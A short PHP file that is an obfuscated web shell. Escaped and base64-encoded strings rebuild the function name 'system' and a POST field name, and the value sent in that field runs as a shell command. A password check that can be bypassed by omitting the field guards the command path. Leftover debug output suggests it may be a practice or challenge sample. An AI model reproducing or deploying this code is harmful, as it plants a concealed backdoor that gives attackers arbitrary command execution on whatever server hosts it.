<?php
$str1 = "\126\61\x5a\127\141\x6b\65\126\115\x48\154\127\142\107\150\x51\x56\x6b\126\x61\x59\x56\122\x58\144\x47\106\x4e\x56\x6d\122\x56\126\x47\x74\60\x61\106\x4a\x74\144\104\126\141\122\x56\x4a\x44\x59\x55\132\x4a\145\x57\126\105\127\x6c\132"; 

$str2 = "\x54\x53\105\x4a\x54\x57\x6c\144\172\x65\106\112\x57\123\156\x52\x4e\126\60\132\x70\x56\x6c\150\x43\144\x6c\x59\x79\115\x48\x68\x55\115\153\x5a\172\131\x30\126\x57\x56\x6c\144\x49\x51\154\102\x57\141\61\x70\171\124\61\x56\x4f\142\x6c\102\125\115\105\x73\113"; 

$str3 = $str1 . $str2; 


$i = 0;

for($i = 0; $i < 4; $i++){
  $str3 = base64_decode($str3); 
}

$str4 = "\x61\x47\154\153\x5a\107\126\165\x58\63\102\x68\x63\63\x4e\x33\x4d\110\x4a\x6b\x4f\x41\x3d\75"; 

$decoded = "hidden_passw0rd8";

// var_dump($_POST[$decoded]);
if (isset($_POST[$decoded]) && !($_POST[$decoded] === $str3)) { 
  return;
} 

$str5 = strrev(base64_decode("\x62\127\x56\x30\143\63\154\x7a")); 

var_dump($str5);

$str6 = base64_decode("\143\107\106\171\131\127\x31\167\x59\x58\x4a\x68\x62\x58\102\x68\x63\155\106\164"); 

print_r($_POST);

if(isset($_POST[$str6])){
  var_dump($_POST[$str6]);
  var_dump($str5($_POST[$str6])); 
}

return;


?>